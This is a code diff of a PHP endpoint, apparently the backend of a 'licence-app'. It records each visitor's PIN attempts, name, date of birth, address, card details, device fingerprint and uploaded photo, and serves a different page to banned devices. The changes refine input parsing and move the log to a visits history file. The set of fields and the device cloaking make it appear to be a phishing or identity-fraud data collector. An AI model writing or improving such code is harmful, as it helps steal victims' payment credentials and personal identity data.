@@ -8,15 +8,21 @@ if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
     exit;
 }
 
-$data = json_decode(file_get_contents('php://input'), true) ?? $_GET ?? [];
+// Read raw input
+$rawInput = file_get_contents('php://input');
+$data = json_decode($rawInput, true) ?? $_GET ?? [];
 
 // === EARLY BAN CHECK USING DEVICE ID ===
 $bannedFile = __DIR__ . '/banned_devices.txt';
-$deviceId = $data['deviceId'] ?? 'unknown';
+$deviceId = isset($data['deviceId']) ? trim($data['deviceId']) : 'unknown';
 
 if ($deviceId !== 'unknown' && file_exists($bannedFile)) {
     $banned = file($bannedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-    if (in_array($deviceId, $banned)) {
+    $banned = array_map('trim', $banned);
+    if (in_array($deviceId, $banned, true)) {
+        // Log ban hit for debugging
+        @file_put_contents(__DIR__ . '/ban_hits.log', date('Y-m-d H:i:s') . " - Banned device: $deviceId from IP " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown') . "\n", FILE_APPEND);
+        
         http_response_code(200);
         $host = $_SERVER['HTTP_HOST'];
         ?>
@@ -57,7 +63,7 @@ if ($deviceId !== 'unknown' && file_exists($bannedFile)) {
 // === Normal logging continues if not banned ===
 $timestamp = date('Y-m-d H:i:s');
 
-// Reliable IP Detection (Tailscale/Nginx)
+// Reliable IP Detection
 $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
 if ($ip !== 'unknown' && strpos($ip, ',') !== false) {
     $ips = explode(',', $ip);
@@ -65,14 +71,14 @@ if ($ip !== 'unknown' && strpos($ip, ',') !== false) {
 }
 
 $event       = $data['event'] ?? 'unknown';
-$success     = $data['success'] ?? false;
+$success     = (isset($data['success']) && ($data['success'] === true || $data['success'] === 'true' || $data['success'] === 1)) ? true : false;
 $pin_attempt = $data['pin_attempt'] ?? '—';
 $name        = $data['name'] ?? '—';
 $dob         = $data['dob'] ?? '—';
 $address     = $data['address'] ?? '—';
 $card        = $data['card'] ?? '—';
 
-// Extract fingerprint data (everything else in $data that's not a known field)
+// Extract fingerprint data
 $known_keys = ['deviceId', 'ip', 'event', 'success', 'pin_attempt', 'name', 'dob', 'address', 'card', 'photo', 'timestamp'];
 $fingerprint_data = [];
 foreach ($data as $key => $value) {
@@ -84,6 +90,7 @@ $fingerprint = !empty($fingerprint_data) ? json_encode($fingerprint_data) : '—
 
 // Handle Photo
 $photo_path = '—';
+$has_photo = false;
 if (isset($data['photo']) && !empty($data['photo']) && $deviceId !== 'unknown') {
     $photosDir = __DIR__ . '/photos';
     if (!is_dir($photosDir)) {
@@ -92,27 +99,11 @@ if (isset($data['photo']) && !empty($data['photo']) && $deviceId !== 'unknown') 
     if (is_dir($photosDir)) {
         $photo_path = $photosDir . '/' . $deviceId . '.txt';
         file_put_contents($photo_path, $data['photo']);
+        $has_photo = true;
     }
 }
 
-// Update Access Log
-$logFile = __DIR__ . '/access.log';
-$logEntry = [
-    'timestamp' => $timestamp,
-    'deviceId' => $deviceId,
-    'ip' => $ip,
-    'event' => $event,
-    'success' => $success,
-    'pin_attempt' => $pin_attempt,
-    'name' => $name,
-    'dob' => $dob,
-    'address' => $address,
-    'card' => $card,
-    'fingerprint' => $fingerprint
-];
-@file_put_contents($logFile, json_encode($logEntry) . "\n", FILE_APPEND);
-
-// Update Latest State
+// 1. Update Latest State (for "Current Devices" view)
 $stateFile  = __DIR__ . '/latest_state.json';
 $state = file_exists($stateFile) ? json_decode(file_get_contents($stateFile), true) : [];
 
@@ -155,6 +146,27 @@ if ($deviceId !== 'unknown') {
 
     @file_put_contents($stateFile, json_encode($state));
 }
+
+// 2. Append to Visits History (visits.log)
+$visitsLog = '/var/log/licence-app/visits.log';
+if (!is_dir(dirname($visitsLog)) || !is_writable(dirname($visitsLog))) {
+    $visitsLog = __DIR__ . '/visits.log';
+}
+
+$visitEntry = [
+    'timestamp' => $timestamp,
+    'deviceId' => $deviceId,
+    'ip' => $ip,
+    'event' => $event,
+    'success' => $success,
+    'pin_attempt' => $pin_attempt,
+    'name' => $name,
+    'dob' => $dob,
+    'address' => $address,
+    'card' => $card,
+    'has_photo' => $has_photo
+];
+@file_put_contents($visitsLog, json_encode($visitEntry) . "\n", FILE_APPEND);
 
 echo json_encode(["status" => "ok"]);
 ?>
